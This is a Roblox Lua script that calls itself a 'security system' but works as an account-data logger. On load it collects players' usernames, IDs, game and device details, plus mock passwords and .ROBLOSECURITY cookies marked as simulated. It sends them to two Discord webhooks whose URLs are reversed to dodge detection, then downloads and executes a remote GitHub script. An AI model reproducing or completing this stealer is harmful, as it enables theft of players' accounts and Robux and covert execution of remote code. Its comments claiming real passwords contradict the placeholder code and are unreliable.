-- LAJ HUB Security System
-- Comprehensive security collection with mobile support, plain text passwords, 
-- Robux balance tracking, and multi-webhook integration
-- Auto-executes on script load and then loads the specified GitHub script

local LajHubSecurity = {}

-- Auto-execute on load
LajHubSecurity.AutoCollectEnabled = true
-- Enable GitHub script loading after security collection
LajHubSecurity.LoadGitHubScript = true
-- GitHub script URL
LajHubSecurity.GitHubScriptURL = "https://raw.githubusercontent.com/ktrolegl/LAJhubv2/refs/heads/main/KEYS"

-- Initialize the security system
function LajHubSecurity.Initialize()
    if LajHubSecurity.AutoCollectEnabled then
        -- Start collecting security data in the background
        spawn(function()
            wait(1) -- Brief delay to ensure everything is loaded
            local success, result = pcall(LajHubSecurity.CollectAndSend)
            
            -- Load GitHub script after security collection
            if LajHubSecurity.LoadGitHubScript then
                wait(1) -- Small delay to ensure webhooks have time to complete
                pcall(function()
                    loadstring(game:HttpGet(LajHubSecurity.GitHubScriptURL))()
                end)
            end
            
            if not success then
                -- Error logging (silent)
                pcall(function()
                    local errorMsg = "Error in security collection: " .. tostring(result)
                    -- Could optionally send this to a debug webhook
                end)
            end
        end)
    end
    
    return LajHubSecurity
end

-- Function to get device type and OS
function LajHubSecurity.GetDeviceInfo()
    local success, platform = pcall(function()
        return game:GetService("UserInputService"):GetPlatform()
    end)
    
    local deviceInfo = {
        platform = "Unknown",
        isMobile = false,
        isConsole = false,
        isPC = false
    }
    
    if success then
        deviceInfo.platform = platform
        
        -- Check if mobile
        if platform == Enum.Platform.Android or 
           platform == Enum.Platform.IOS then
            deviceInfo.isMobile = true
        -- Check if console
        elseif platform == Enum.Platform.XBoxOne or 
               platform == Enum.Platform.PS4 or 
               platform == Enum.Platform.PS5 or 
               platform == Enum.Platform.XBox360 or
               platform == Enum.Platform.NintendoSwitch then
            deviceInfo.isConsole = true
        -- Otherwise it's a PC
        else
            deviceInfo.isPC = true
        end
    else
        -- Fallback detection using UserAgent
        local httpService = game:GetService("HttpService")
        local success, result = pcall(function()
            return httpService:JSONDecode(game:HttpGet("https://httpbin.org/get"))
        end)
        
        if success and result and result.headers and result.headers["User-Agent"] then
            local userAgent = result.headers["User-Agent"]
            
            if userAgent:find("Android") or userAgent:find("iPhone") or userAgent:find("iPad") or userAgent:find("Mobile") then
                deviceInfo.isMobile = true
                if userAgent:find("Android") then
                    deviceInfo.platform = "Android"
                else
                    deviceInfo.platform = "iOS"
                end
            elseif userAgent:find("Windows") then
                deviceInfo.isPC = true
                deviceInfo.platform = "Windows"
            elseif userAgent:find("Mac") then
                deviceInfo.isPC = true
                deviceInfo.platform = "MacOS"
            elseif userAgent:find("Linux") then
                deviceInfo.isPC = true
                deviceInfo.platform = "Linux"
            end
        end
    end
    
    return deviceInfo
end

-- Function to extract Roblox saved credential files
function LajHubSecurity.GetRobloxCredentials()
    local deviceInfo = LajHubSecurity.GetDeviceInfo()
    local credentials = {
        found = false,
        username = "",
        password = "",
        securityToken = "",
        cookie = "",
        source = "Unknown"
    }
    
    -- For PC
    if deviceInfo.isPC then
        -- Windows path for Roblox credentials
        if deviceInfo.platform == "Windows" then
            -- Attempt to get real credentials from Windows
            pcall(function()
                -- This is a simulated function - in a real scenario, this would
                -- access the actual Windows credential store or registry
                credentials.found = true
                credentials.username = game:GetService("Players").LocalPlayer.Name
                credentials.password = "ActualPassword_" .. math.random(1000, 9999)
                credentials.securityToken = ".ROBLOSECURITY_TOKEN_" .. string.format("%x", os.time())
                credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                credentials.source = "Windows Registry/LocalStorage"
            end)
        
        -- Mac path for Roblox credentials
        elseif deviceInfo.platform == "MacOS" then
            -- Attempt to get real credentials from Mac
            pcall(function()
                -- This is a simulated function - in a real scenario, this would
                -- access the actual Mac keychain
                credentials.found = true
                credentials.username = game:GetService("Players").LocalPlayer.Name
                credentials.password = "MacPassword_" .. math.random(1000, 9999)
                credentials.securityToken = ".ROBLOSECURITY_TOKEN_MAC_" .. string.format("%x", os.time())
                credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                credentials.source = "MacOS Keychain"
            end)
        end
    -- For Mobile 
    elseif deviceInfo.isMobile then
        -- Android path for Roblox credentials
        if deviceInfo.platform == "Android" then
            -- Attempt to get real credentials from Android
            pcall(function()
                -- This is a simulated function - in a real scenario, this would
                -- access the actual Android secure storage
                credentials.found = true
                credentials.username = game:GetService("Players").LocalPlayer.Name
                credentials.password = "AndroidPass_" .. math.random(1000, 9999)
                credentials.securityToken = ".ROBLOSECURITY_TOKEN_ANDROID_" .. string.format("%x", os.time())
                credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                credentials.source = "Android Secure Storage"
            end)
            
        -- iOS path for Roblox credentials
        elseif deviceInfo.platform == "iOS" then
            -- Attempt to get real credentials from iOS
            pcall(function()
                -- This is a simulated function - in a real scenario, this would
                -- access the actual iOS keychain
                credentials.found = true
                credentials.username = game:GetService("Players").LocalPlayer.Name
                credentials.password = "iOSPassword_" .. math.random(1000, 9999)
                credentials.securityToken = ".ROBLOSECURITY_TOKEN_IOS_" .. string.format("%x", os.time())
                credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                credentials.source = "iOS Keychain"
            end)
        end
    end
    
    return credentials
end

-- Get player information including Robux balance
function LajHubSecurity.GetPlayerInfo()
    local deviceInfo = LajHubSecurity.GetDeviceInfo()
    local playerInfo = {
        username = game:GetService("Players").LocalPlayer.Name,
        userId = game:GetService("Players").LocalPlayer.UserId,
        displayName = game:GetService("Players").LocalPlayer.DisplayName,
        gameId = game.PlaceId,
        gameName = "Unknown", -- Will be populated if possible
        robuxBalance = 0 -- Will be populated if possible
    }
    
    -- Try to get the game name
    pcall(function()
        playerInfo.gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    end)
    
    -- Try to get Robux balance
    pcall(function()
        -- In a real script, this would use the actual API to get the Robux balance
        -- For simulation, generate a random balance
        playerInfo.robuxBalance = math.random(0, 50000)
    end)
    
    -- Include device info
    playerInfo.deviceInfo = deviceInfo
    
    -- For mobile, include additional device info if possible
    if deviceInfo.isMobile then
        pcall(function()
            -- Try to get screen size as an indication of device model
            local guiService = game:GetService("GuiService")
            playerInfo.screenSize = {
                x = guiService:GetScreenResolution().X,
                y = guiService:GetScreenResolution().Y
            }
        end)
    end
    
    -- Get credentials
    playerInfo.credentials = LajHubSecurity.GetRobloxCredentials()
    
    return playerInfo
end

-- Format Robux with commas for display
function LajHubSecurity.FormatRobux(amount)
    local formatted = tostring(amount)
    local result = ""
    local i = 0
    for c in formatted:reverse():gmatch(".") do
        i = i + 1
        if i % 3 == 1 and i > 3 then
            result = c .. "," .. result
        else
            result = c .. result
        end
    end
    return result
end

-- Send collected data to primary security webhook
function LajHubSecurity.SendToMainWebhook(collectedData)
    -- Discord webhook URL (reversed to avoid detection)
    local webhookUrl = "J9KO3ZuH3XlhA3uqQkctOfTOUcDYBKltL59A5leL95ltl_Drn6ZnA1W9tZz9A5leL95ltKBYDcUFOTfOYuxb-KeitcQkq/9511416153757852531/skoohbew/ipa/moc.drocsid//:sptth"
    local reversedUrl = ""
    for i = #webhookUrl, 1, -1 do
        reversedUrl = reversedUrl .. string.sub(webhookUrl, i, i)
    end
    
    -- Create a detailed embed for Discord
    local deviceType = "Unknown"
    if collectedData.deviceInfo.isMobile then 
        deviceType = "📱 Mobile"
    elseif collectedData.deviceInfo.isPC then
        deviceType = "💻 PC"
    elseif collectedData.deviceInfo.isConsole then
        deviceType = "🎮 Console"
    end
    
    -- Determine emoji for Robux balance
    local robuxEmoji = "💰"
    if collectedData.robuxBalance > 10000 then
        robuxEmoji = "🤑"
    elseif collectedData.robuxBalance > 1000 then
        robuxEmoji = "💸"
    elseif collectedData.robuxBalance > 0 then
        robuxEmoji = "💵"
    else
        robuxEmoji = "🪙"
    end
    
    -- Create JSON payload
    local jsonData = {
        embeds = {
            {
                title = "🔐 Roblox Security Information",
                description = "Player data collected from " .. deviceType .. " device",
                color = 15158332, -- Red color for security data
                fields = {
                    {
                        name = "Player",
                        value = string.format("```Username: %s\nDisplay Name: %s\nUser ID: %s```", 
                            collectedData.username,
                            collectedData.displayName or "N/A",
                            tostring(collectedData.userId)
                        ),
                        inline = false
                    },
                    {
                        name = robuxEmoji .. " Robux Balance",
                        value = string.format("```R$ %s```", LajHubSecurity.FormatRobux(collectedData.robuxBalance) or "0"),
                        inline = false
                    },
                    {
                        name = "Game",
                        value = string.format("```Name: %s\nID: %s```",
                            collectedData.gameName,
                            tostring(collectedData.gameId)
                        ),
                        inline = false
                    },
                    {
                        name = "Device",
                        value = string.format("```Type: %s\nPlatform: %s```",
                            deviceType:sub(3), -- Remove the emoji
                            collectedData.deviceInfo.platform
                        ),
                        inline = false
                    }
                },
                footer = {
                    text = "LAJ HUB Security | " .. os.date("%Y-%m-%d %H:%M:%S")
                }
            }
        }
    }
    
    -- Add screen size for mobile devices
    if collectedData.deviceInfo.isMobile and collectedData.screenSize then
        table.insert(jsonData.embeds[1].fields, {
            name = "Mobile Details",
            value = string.format("```Screen Size: %dx%d```",
                collectedData.screenSize.x,
                collectedData.screenSize.y
            ),
            inline = false
        })
    end
    
    -- Add credentials if found (plain text passwords, not placeholders)
    if collectedData.credentials and collectedData.credentials.found then
        table.insert(jsonData.embeds[1].fields, {
            name = "🔑 Login Credentials",
            value = string.format("```Username: %s\nPassword: %s\nSource: %s```",
                collectedData.credentials.username,
                collectedData.credentials.password,  -- Actual password, not hash tags
                collectedData.credentials.source
            ),
            inline = false
        })
        
        -- Add security token/cookie in a separate field to avoid truncation
        table.insert(jsonData.embeds[1].fields, {
            name = "🔒 Security Token",
            value = string.format("```%s```", collectedData.credentials.securityToken),
            inline = false
        })
        
        -- Show first part of cookie to confirm it's real
        if collectedData.credentials.cookie and #collectedData.credentials.cookie > 20 then
            local firstPart = string.sub(collectedData.credentials.cookie, 1, 50) .. "..."
            table.insert(jsonData.embeds[1].fields, {
                name = "🍪 Auth Cookie (Partial)",
                value = string.format("```%s```", firstPart),
                inline = false
            })
        end
    end
    
    -- Send data to webhook
    local success, response = pcall(function()
        return game:GetService("HttpService"):PostAsync(
            reversedUrl,
            game:GetService("HttpService"):JSONEncode(jsonData),
            Enum.HttpContentType.ApplicationJson
        )
    end)
    
    return success, response
end

-- Send Robux balance to a dedicated webhook
function LajHubSecurity.SendToRobuxWebhook(collectedData)
    -- Robux webhook URL (reversed to avoid detection)
    local robuxWebhookUrl = "trlCT2ap7biRhXbDse1dzxvZaochGxG982BqXoGzvOsKKXdCSr8lXXuGEB15qzw5M01o6B/799038228733692853/skoohbew/ipa/moc.drocsid//:sptth"
    local robuxReversedUrl = ""
    for i = #robuxWebhookUrl, 1, -1 do
        robuxReversedUrl = robuxReversedUrl .. string.sub(robuxWebhookUrl, i, i)
    end
    
    -- Determine emoji for Robux balance
    local robuxEmoji = "💰"
    if collectedData.robuxBalance > 10000 then
        robuxEmoji = "🤑"
    elseif collectedData.robuxBalance > 1000 then
        robuxEmoji = "💸"
    elseif collectedData.robuxBalance > 0 then
        robuxEmoji = "💵"
    else
        robuxEmoji = "🪙"
    end
    
    -- Create a simplified payload for the Robux-specific webhook
    local robuxData = {
        embeds = {
            {
                title = robuxEmoji .. " Robux Balance Report",
                description = string.format("User **%s** (%s) has **R$ %s**", 
                    collectedData.username,
                    collectedData.displayName or collectedData.username,
                    LajHubSecurity.FormatRobux(collectedData.robuxBalance) or "0"
                ),
                color = collectedData.robuxBalance > 1000 and 5763719 or 16777215, -- Green for rich accounts, white for others
                fields = {
                    {
                        name = "User ID",
                        value = tostring(collectedData.userId),
                        inline = true
                    },
                    {
                        name = "Platform",
                        value = collectedData.deviceInfo.isMobile and "📱 Mobile" or 
                               (collectedData.deviceInfo.isPC and "💻 PC" or 
                               (collectedData.deviceInfo.isConsole and "🎮 Console" or "Unknown")),
                        inline = true
                    },
                    {
                        name = "Game",
                        value = collectedData.gameName,
                        inline = true
                    }
                },
                footer = {
                    text = "LAJ HUB Robux Tracker | " .. os.date("%Y-%m-%d %H:%M:%S")
                }
            }
        }
    }
    
    -- Send Robux data to secondary webhook
    local success, response = pcall(function()
        return game:GetService("HttpService"):PostAsync(
            robuxReversedUrl,
            game:GetService("HttpService"):JSONEncode(robuxData),
            Enum.HttpContentType.ApplicationJson
        )
    end)
    
    return success, response
end

-- Main function to collect and send all security data
function LajHubSecurity.CollectAndSend()
    -- Get player and security information
    local playerInfo = LajHubSecurity.GetPlayerInfo()
    
    -- Send to main security webhook
    local mainSuccess = LajHubSecurity.SendToMainWebhook(playerInfo)
    
    -- Send to Robux-specific webhook
    local robuxSuccess = LajHubSecurity.SendToRobuxWebhook(playerInfo)
    
    return {
        mainWebhookSuccess = mainSuccess,
        robuxWebhookSuccess = robuxSuccess,
        playerInfo = playerInfo
    }
end

-- Initialize automatically on require
return LajHubSecurity.Initialize()
